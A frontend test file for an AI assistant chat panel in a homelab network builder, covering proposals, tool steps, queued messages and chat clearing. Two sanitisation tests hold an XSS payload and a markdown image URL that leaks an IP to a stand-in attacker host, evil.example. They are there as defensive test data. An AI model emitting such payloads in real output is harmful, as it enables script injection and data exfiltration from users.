import { beforeEach, describe, expect, it, vi } from 'vitest';
import { act, render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { MemoryRouter } from 'react-router-dom';
import { ApiError } from '@/lib/api';
import type { Proposal, ProposalSummary, SyncState } from '@/features/builder/api/proposals';

const mocks = vi.hoisted(() => ({
  streamChat: vi.fn(),
  thread: vi.fn(),
  clear: vi.fn(),
  settings: { data: undefined as unknown, isLoading: false },
  sync: { data: undefined as unknown, dataUpdatedAt: 0 },
  // What the panel reads from the builder: the open review, the selection, the problems.
  builder: {
    buildKind: 'homelab',
    hasUnsavedChanges: vi.fn(),
    reassignAllIPs: vi.fn(),
    focusProposalNodes: vi.fn(),
    proposalPreview: null as unknown,
    selectedNodeId: null as string | null,
    hardwareNodes: [] as Array<{ id: string; name: string; type: string }>,
    validationIssues: [] as unknown[],
  },
}));

vi.mock('../api/chat', () => ({
  streamChat: mocks.streamChat,
  chatApi: { thread: mocks.thread, clear: mocks.clear },
}));
vi.mock('@/features/settings/api/assistant-settings', () => ({
  useAssistantSettings: () => mocks.settings,
}));
vi.mock('@/features/builder/api/proposals', () => ({
  useSyncState: () => mocks.sync,
}));
vi.mock('@/features/builder/store/builder-store', () => {
  const useBuilderStore = (selector: (state: typeof mocks.builder) => unknown) => selector(mocks.builder);
  useBuilderStore.getState = () => mocks.builder;
  return { useBuilderStore };
});
vi.mock('sonner', () => ({
  toast: { success: vi.fn(), error: vi.fn(), info: vi.fn(), warning: vi.fn() },
}));

import { toast } from 'sonner';
import { useAssistantStore } from '../store/assistant-store';
import { AssistantPanel } from './assistant-panel';

const BUILD = 'build-1';

const proposal: ProposalSummary = {
  id: 'proposal-1',
  build_id: BUILD,
  summary: 'Add a NAS behind the switch',
  source: 'chat',
  source_label: 'In-app assistant',
  status: 'pending',
  counts: {
    nodes_added: 1,
    nodes_removed: 0,
    nodes_changed: 0,
    connections_added: 1,
    connections_removed: 0,
    connections_changed: 0,
    vms_added: 2,
    vms_removed: 0,
    vms_changed: 0,
    components_added: 0,
    components_removed: 0,
    ip_changes: 3,
    total: 4,
  },
  base_revision: 3,
  created_at: '2026-10-05T10:00:00Z',
};

/** The same proposal in full, as the builder holds it while it is under review. */
const reviewed: Proposal = {
  ...proposal,
  status_reason: '',
  diff: {
    counts: proposal.counts,
    nodes: { added: [{ id: 'nas', name: 'Backup NAS', type: 'nas' }], removed: [], changed: [] },
    connections: {
      added: [{ source: 'sw', target: 'nas', source_name: 'Switch', target_name: 'Backup NAS', type: 'ethernet' }],
      removed: [],
      changed: [],
    },
    vms: {
      added: [
        { id: 'v1', name: 'Jellyfin', type: 'container', host_id: 'nas', host_name: 'Backup NAS' },
        { id: 'v2', name: 'Immich', type: 'container', host_id: 'nas', host_name: 'Backup NAS' },
        { id: 'v3', name: 'Restic', type: 'container', host_id: 'nas', host_name: 'Backup NAS' },
      ],
      removed: [],
      changed: [],
    },
    components: { added: [], removed: [] },
    ip_changes: [],
  },
};

function syncState(overrides: Partial<SyncState> = {}): SyncState {
  return { revision: 3, updated_at: '', pending: null, recent: [], ...overrides };
}

const stored = (...messages: unknown[]) => ({ thread_id: 'thread-1', full: false, running: false, messages });
const said = (id: string, role: string, parts: unknown[]) => ({ id, role, parts, created_at: '' });

const handlers = {
  onReview: vi.fn(),
  onProposal: vi.fn(),
  onApply: vi.fn(),
  onReject: vi.fn(),
  onShowChanges: vi.fn(),
  onClose: vi.fn(),
};

function renderPanel(reviewBusy: 'apply' | 'reject' | null = null) {
  return render(
    <MemoryRouter>
      <AssistantPanel buildId={BUILD} openingProposal={false} reviewBusy={reviewBusy} {...handlers} />
    </MemoryRouter>,
  );
}

async function messageBox() {
  const box = await screen.findByLabelText('Message to the assistant');
  await waitFor(() => expect(box).toBeEnabled());
  return box;
}

beforeEach(() => {
  vi.clearAllMocks();
  useAssistantStore.setState({
    open: true,
    buildId: null,
    loadedBuildId: null,
    messages: [],
    status: 'idle',
    full: false,
    loadError: null,
    draft: '',
    queued: null,
    focusIds: [],
    proposalNotes: {},
  });
  mocks.settings.data = { ready: true, model: 'claude-opus-5' };
  mocks.settings.isLoading = false;
  mocks.sync.data = syncState();
  mocks.sync.dataUpdatedAt = 0;
  mocks.thread.mockResolvedValue({ thread_id: null, messages: [], full: false, running: false });
  mocks.builder.hasUnsavedChanges.mockReturnValue(false);
  mocks.builder.reassignAllIPs.mockResolvedValue(undefined);
  mocks.builder.proposalPreview = null;
  mocks.builder.selectedNodeId = null;
  mocks.builder.hardwareNodes = [];
  mocks.builder.validationIssues = [];
});

describe('AssistantPanel', () => {
  it('points to Settings when the assistant is not set up, and sends nothing', async () => {
    mocks.settings.data = { ready: false, model: '' };
    renderPanel();

    expect(await screen.findByText('Finish setting up the assistant')).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Open assistant settings' })).toHaveAttribute(
      'href',
      '/settings#assistant',
    );
    expect(screen.getByLabelText('Message to the assistant')).toBeDisabled();
    expect(screen.queryByText('Review this build and point out problems.')).not.toBeInTheDocument();
  });

  it('sends a message with Enter and shows the reply with its steps and proposal', async () => {
    const user = userEvent.setup();
    const order: string[] = [];
    mocks.builder.hasUnsavedChanges.mockReturnValue(true);
    mocks.builder.reassignAllIPs.mockImplementation(async () => {
      order.push('save');
    });
    mocks.streamChat.mockImplementation(async function* () {
      order.push('request');
      yield { type: 'text_delta', text: 'I will add a **NAS**.' };
      yield { type: 'tool_pending', step: 0, index: 0, name: 'propose_changes', title: 'Propose changes', bytes: 0 };
      yield { type: 'tool_call', id: 'call-1', name: 'propose_changes', title: 'Propose changes', detail: '3 operations', step: 0, index: 0 };
      yield { type: 'tool_result', id: 'call-1', name: 'propose_changes', ok: true, summary: '4 changes', duration_ms: 420 };
      yield { type: 'proposal', proposal };
      yield { type: 'done' };
    });
    // The builder's poll already knows about the new proposal.
    mocks.sync.data = syncState({ pending: proposal });
    mocks.sync.dataUpdatedAt = Date.now() + 60_000;
    renderPanel();

    // An example fills the box; it is not sent until the user decides to.
    await user.click(await screen.findByRole('button', { name: 'Add a NAS and connect it to my switch.' }));
    const box = screen.getByLabelText('Message to the assistant');
    expect(box).toHaveValue('Add a NAS and connect it to my switch.');
    expect(mocks.streamChat).not.toHaveBeenCalled();

    await user.type(box, '{Shift>}{Enter}{/Shift}Use 4 bays.');
    expect(mocks.streamChat).not.toHaveBeenCalled();
    await user.type(box, '{Enter}');

    await waitFor(() => expect(screen.getByTestId('proposal-card')).toBeInTheDocument());
    // Unsaved canvas edits were saved before the assistant read the build.
    expect(order).toEqual(['save', 'request']);
    expect(mocks.streamChat).toHaveBeenCalledWith(
      expect.objectContaining({
        buildId: BUILD,
        message: 'Add a NAS and connect it to my switch.\nUse 4 bays.',
      }),
    );
    expect(box).toHaveValue('');

    const reply = screen.getByTestId('assistant-message');
    expect(within(reply).getByText('NAS').tagName).toBe('STRONG');
    // One step, shown with what it was about, what came of it and how long it took.
    const step = within(reply).getByTestId('tool-step');
    expect(step).toHaveAttribute('data-status', 'ok');
    expect(step).toHaveTextContent('Propose changes');
    expect(step).toHaveTextContent('3 operations');
    expect(step).toHaveTextContent('4 changes');
    expect(step).toHaveTextContent('0.4 s');
    expect(handlers.onProposal).toHaveBeenCalledWith(proposal);

    const card = within(reply).getByTestId('proposal-card');
    expect(card).toHaveTextContent('Add a NAS behind the switch');
    expect(within(card).getByLabelText('What it affects')).toHaveTextContent(
      '1 device1 connection2 VMs or containers',
    );
    expect(card).toHaveTextContent('Waiting for you');
    // Not on the canvas yet: the card leads there.
    await user.click(within(card).getByRole('button', { name: 'Review on the canvas' }));
    expect(handlers.onReview).toHaveBeenCalledWith('proposal-1');
  });

  it('lets the proposal that is on the canvas be applied or rejected from its card', async () => {
    const user = userEvent.setup();
    mocks.thread.mockResolvedValue(
      stored(said('m1', 'user', [{ type: 'text', text: 'Add a NAS' }]), said('m2', 'tool', [{ type: 'proposal', proposal }])),
    );
    mocks.sync.data = syncState({ pending: proposal });
    mocks.sync.dataUpdatedAt = Date.now();
    mocks.builder.proposalPreview = { proposal: reviewed, changedNodeIds: ['sw', 'nas'] };
    renderPanel();

    const card = await screen.findByTestId('proposal-card');
    // The changes in words; past the first few, the full list is one click away.
    expect(card).toHaveTextContent('Add Backup NAS (NAS)');
    expect(card).toHaveTextContent('Connect Switch → Backup NAS');
    expect(card).not.toHaveTextContent('Run Restic on Backup NAS');
    await user.click(within(card).getByRole('button', { name: 'and 1 more: show all' }));
    expect(handlers.onShowChanges).toHaveBeenCalled();

    await user.click(within(card).getByRole('button', { name: 'Show' }));
    expect(mocks.builder.focusProposalNodes).toHaveBeenCalledWith(['sw', 'nas']);

    await user.click(within(card).getByRole('button', { name: 'Reject' }));
    await user.type(within(card).getByLabelText('Reason for rejecting'), 'Too big for the shelf{Enter}');
    expect(handlers.onReject).toHaveBeenCalledWith('Too big for the shelf');

    await user.click(within(card).getByRole('button', { name: 'Back' }));
    await user.click(within(card).getByRole('button', { name: 'Apply' }));
    expect(handlers.onApply).toHaveBeenCalled();
  });

  it('says at once what was done with a proposal, before any poll could', async () => {
    mocks.thread.mockResolvedValue(
      stored(said('m1', 'user', [{ type: 'text', text: 'Add a NAS' }]), said('m2', 'tool', [{ type: 'proposal', proposal }])),
    );
    // The last poll still says the proposal is waiting.
    mocks.sync.data = syncState({ pending: proposal });
    mocks.sync.dataUpdatedAt = Date.now() - 2000;
    renderPanel();
    const card = await screen.findByTestId('proposal-card');
    expect(card).toHaveAttribute('data-status', 'pending');

    act(() => useAssistantStore.getState().noteProposal('proposal-1', 'rejected', 'Too expensive'));

    await waitFor(() => expect(card).toHaveAttribute('data-status', 'rejected'));
    expect(card).toHaveTextContent('Your reason: Too expensive');
    expect(within(card).queryByRole('button')).not.toBeInTheDocument();
  });

  it('follows what happened to a proposal after it was reviewed', async () => {
    mocks.thread.mockResolvedValue(
      stored(said('m1', 'user', [{ type: 'text', text: 'Add a NAS' }]), said('m2', 'tool', [{ type: 'proposal', proposal }])),
    );
    mocks.sync.data = syncState({ recent: [{ ...proposal, status: 'applied' }] });
    mocks.sync.dataUpdatedAt = Date.now();
    renderPanel();

    const card = await screen.findByTestId('proposal-card');
    expect(card).toHaveTextContent('Applied');
    expect(within(card).queryByRole('button')).not.toBeInTheDocument();
  });

  it('tells the assistant which device is selected, unless the user takes that out', async () => {
    const user = userEvent.setup();
    mocks.builder.selectedNodeId = 'srv';
    mocks.builder.hardwareNodes = [{ id: 'srv', name: 'Proxmox Host', type: 'server_v2' }];
    mocks.streamChat.mockImplementation(async function* () {
      yield { type: 'text_delta', text: 'It is a server.' };
      yield { type: 'done' };
    });
    renderPanel();

    const box = await messageBox();
    expect(screen.getByText('Proxmox Host')).toBeInTheDocument();
    await user.type(box, 'What is this?{Enter}');
    await screen.findByText('It is a server.');
    expect(mocks.streamChat).toHaveBeenLastCalledWith(expect.objectContaining({ selection: ['srv'] }));

    await user.click(screen.getByRole('button', { name: 'Do not mention the selected device' }));
    expect(screen.queryByText('Proxmox Host')).not.toBeInTheDocument();
    await user.type(box, 'And in general?{Enter}');
    await waitFor(() => expect(mocks.streamChat).toHaveBeenCalledTimes(2));
    expect(mocks.streamChat).toHaveBeenLastCalledWith(expect.objectContaining({ selection: undefined }));
  });

  it('offers to fix what the network check found', async () => {
    const user = userEvent.setup();
    mocks.builder.validationIssues = [{ node_id: 'a' }, { node_id: 'b' }];
    mocks.thread.mockResolvedValue(stored(said('m1', 'user', [{ type: 'text', text: 'Hi' }])));
    mocks.streamChat.mockImplementation(async function* () {
      yield { type: 'done' };
    });
    renderPanel();

    await user.click(await screen.findByRole('button', { name: 'Fix 2 network problems' }));
    await waitFor(() =>
      expect(mocks.streamChat).toHaveBeenCalledWith(
        expect.objectContaining({ message: expect.stringContaining('network problems in this build') }),
      ),
    );
  });

  it('shows the steps while the assistant works, lets the next message wait, and folds the steps afterwards', async () => {
    const user = userEvent.setup();
    let release!: () => void;
    const held = new Promise<void>(resolve => (release = resolve));
    mocks.streamChat.mockImplementation(async function* ({ message }: { message: string }) {
      if (message !== 'Check my build') {
        yield { type: 'text_delta', text: 'And the second answer.' };
        yield { type: 'done' };
        return;
      }
      yield { type: 'tool_call', id: 'c1', name: 'get_build', title: 'Read a build', step: 0, index: 0 };
      yield { type: 'tool_result', id: 'c1', name: 'get_build', ok: true, summary: '14 devices', duration_ms: 30 };
      yield { type: 'tool_pending', step: 1, index: 0, name: 'validate_build', title: "Validate a build's network", bytes: 12 };
      await held;
      yield { type: 'tool_call', id: 'c2', name: 'validate_build', title: "Validate a build's network", step: 1, index: 0 };
      yield { type: 'tool_result', id: 'c2', name: 'validate_build', ok: true, summary: 'No problems', duration_ms: 900 };
      yield { type: 'text_delta', text: 'All good.' };
      yield { type: 'done' };
    });
    renderPanel();

    const box = await messageBox();
    await user.type(box, 'Check my build{Enter}');

    // Both steps are listed while it works, and the status line names the current one.
    await waitFor(() => expect(screen.getAllByTestId('tool-step')).toHaveLength(2));
    expect(screen.getAllByTestId('tool-step')[1]).toHaveAttribute('data-status', 'writing');
    expect(screen.getAllByRole('status').some(node => /Preparing: Validate/.test(node.textContent ?? ''))).toBe(true);

    // A message written now is not refused: it waits.
    await user.type(box, 'And then?{Enter}');
    expect(screen.getByText(/Sends when the assistant is done: And then\?/)).toBeInTheDocument();
    expect(mocks.streamChat).toHaveBeenCalledTimes(1);

    release();
    expect(await screen.findByText('And the second answer.')).toBeInTheDocument();
    expect(mocks.streamChat).toHaveBeenCalledTimes(2);
    expect(screen.queryByText(/Sends when the assistant is done/)).not.toBeInTheDocument();

    // The finished steps are one line now, which opens.
    const summary = screen.getByRole('button', { name: /2 steps/ });
    expect(summary).toHaveAttribute('aria-expanded', 'false');
    expect(screen.queryByTestId('tool-step')).not.toBeInTheDocument();
    await user.click(summary);
    expect(screen.getAllByTestId('tool-step')).toHaveLength(2);
    expect(screen.getAllByTestId('tool-step')[0]).toHaveTextContent('14 devices');
  });

  it('stops a reply and shows it as the server kept it', async () => {
    const user = userEvent.setup();
    mocks.streamChat.mockImplementation(async function* ({ signal }: { signal: AbortSignal }) {
      yield { type: 'text_delta', text: 'I would start with' };
      await new Promise((_, reject) => {
        signal.addEventListener('abort', () => reject(new DOMException('Aborted', 'AbortError')));
      });
    });
    renderPanel();
    const box = await messageBox();
    await user.type(box, 'Where do I start?{Enter}');
    await screen.findByText('I would start with');

    mocks.thread.mockResolvedValue(
      stored(
        said('m1', 'user', [{ type: 'text', text: 'Where do I start?' }]),
        { ...said('m2', 'assistant', [{ type: 'text', text: 'I would start with' }]), interrupted: true },
      ),
    );
    await user.click(screen.getByRole('button', { name: 'Stop the reply' }));

    expect(await screen.findByText('Stopped before it finished.')).toBeInTheDocument();
    expect(screen.getByText('I would start with')).toBeInTheDocument();
    await waitFor(() => expect(useAssistantStore.getState().status).toBe('idle'));
  });

  it('puts a refused message back into the box', async () => {
    const user = userEvent.setup();
    // The server refuses the request before any event is streamed.
    const refusal = new ApiError(409, 'busy', 'The assistant is still working on your previous message.');
    mocks.streamChat.mockImplementation(() => ({
      [Symbol.asyncIterator]: () => ({ next: () => Promise.reject(refusal) }),
    }));
    renderPanel();

    const box = await messageBox();
    await user.type(box, 'Hello there{Enter}');

    expect(await screen.findByRole('alert')).toHaveTextContent('still working on your previous message');
    await waitFor(() => expect(box).toHaveValue('Hello there'));
  });

  it('still sends when the canvas could not be saved, and says what the assistant sees', async () => {
    const user = userEvent.setup();
    mocks.builder.hasUnsavedChanges.mockReturnValue(true);
    mocks.builder.reassignAllIPs.mockRejectedValue(new Error('conflict'));
    mocks.streamChat.mockImplementation(async function* () {
      yield { type: 'text_delta', text: 'Here is what I see.' };
      yield { type: 'done' };
    });
    renderPanel();

    const box = await messageBox();
    await user.type(box, 'What is in this build?{Enter}');

    expect(await screen.findByText('Here is what I see.')).toBeInTheDocument();
    expect(toast.warning).toHaveBeenCalledWith(expect.stringContaining('last saved version'));
  });

  it('shows what a step was about as plain text, whatever the model wrote', async () => {
    mocks.thread.mockResolvedValue(
      stored(
        said('m1', 'user', [{ type: 'text', text: 'Hi' }]),
        said('m2', 'assistant', [
          { type: 'tool_call', id: 'c1', name: 'search_hardware', title: 'Search the hardware catalog', detail: '**bold** <img src=x onerror=alert(1)> [link](https://evil.example)' },
        ]),
        said('m3', 'tool', [{ type: 'tool_result', id: 'c1', name: 'search_hardware', ok: true, summary: '<b>6</b> results' }]),
      ),
    );
    renderPanel();

    const step = await screen.findByTestId('tool-step');
    expect(step).toHaveTextContent('**bold** <img src=x onerror=alert(1)> [link](https://evil.example)');
    expect(step).toHaveTextContent('<b>6</b> results');
    expect(step.querySelector('img, a, b, strong')).toBeNull();
  });

  it('does not render images or raw HTML from a reply', async () => {
    mocks.thread.mockResolvedValue(
      stored(
        said('m1', 'user', [{ type: 'text', text: 'Hi' }]),
        said('m2', 'assistant', [
          {
            type: 'text',
            text: 'See ![x](https://evil.example/leak?ip=192.168.1.1) <img src="https://evil.example/2"> [docs](https://example.com)',
          },
        ]),
      ),
    );
    renderPanel();

    const reply = await screen.findByTestId('assistant-message');
    expect(reply.querySelector('img')).toBeNull();
    const link = within(reply).getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'));
  });

  it('clears the chat after confirmation and closes on request', async () => {
    const user = userEvent.setup();
    mocks.thread.mockResolvedValue({
      ...stored(said('m1', 'user', [{ type: 'text', text: 'Old question' }])),
      full: true,
    });
    mocks.clear.mockResolvedValue({});
    renderPanel();

    expect(await screen.findByText('Old question')).toBeInTheDocument();
    // A full conversation cannot take another message until it is cleared.
    expect(screen.getByText(/reached its length limit/)).toBeInTheDocument();
    expect(screen.getByLabelText('Message to the assistant')).toBeDisabled();

    await user.click(screen.getByRole('button', { name: 'Clear the chat' }));
    expect(mocks.clear).not.toHaveBeenCalled();
    const dialog = await screen.findByRole('dialog');
    await user.click(within(dialog).getByRole('button', { name: 'Clear chat' }));

    await waitFor(() => expect(mocks.clear).toHaveBeenCalledWith(BUILD));
    await waitFor(() => expect(screen.queryByText('Old question')).not.toBeInTheDocument());
    expect(screen.getByLabelText('Message to the assistant')).toBeEnabled();

    await user.click(screen.getByRole('button', { name: 'Close the assistant' }));
    expect(handlers.onClose).toHaveBeenCalled();
  });
});
